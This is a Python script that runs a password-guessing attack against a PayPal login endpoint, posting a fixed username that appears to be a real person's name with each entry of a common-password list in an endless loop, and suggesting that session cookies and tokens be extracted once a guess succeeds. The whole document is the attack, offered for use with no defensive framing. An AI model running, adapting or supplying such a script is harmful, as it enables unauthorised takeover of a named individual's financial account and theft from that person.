import requests
import time

# Replace with actual PayPal login URL
login_url = "https://www.paypal.com/api/login"

# Replace with actual headers (you can use browser developer tools to inspect)
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Replace with actual login payload format (you can adjust this)
payload = {
    "username": "Maryline Lelei",
    "password": "",  # This will be replaced with each password
    "remember_me": "true"
}

# Password list (you can replace this with a file or list of passwords)
passwords = [
    "password", "123456", "123456789", "qwerty", "abc123", "admin", "12345678",
    "letmein", "hello", "1234567890", "111111", "123123", "666666", "777777",
    "888888", "999999", "000000", "123321", "12345", "1234567", "12de3456"
]

# Load passwords from a file (optional)
# with open("passwords.txt", "r") as f:
#     passwords = [line.strip() for line in f]

while True:
    for pwd in passwords:
        payload["password"] = pwd
        response = requests.post(login_url, headers=headers, data=payload)

        if response.status_code == 200:
            print(f"[SUCCESS] Password found: {pwd}")
            print("Login successful!")
            # You can add code here to extract session cookies, tokens, etc.
            break
        else:
            print(f"[TRYING] Password: {pwd} | Status: {response.status_code}")

        time.sleep(0.5)  # Small delay to avoid overwhelming the server

    if response.status_code == 200:
        break
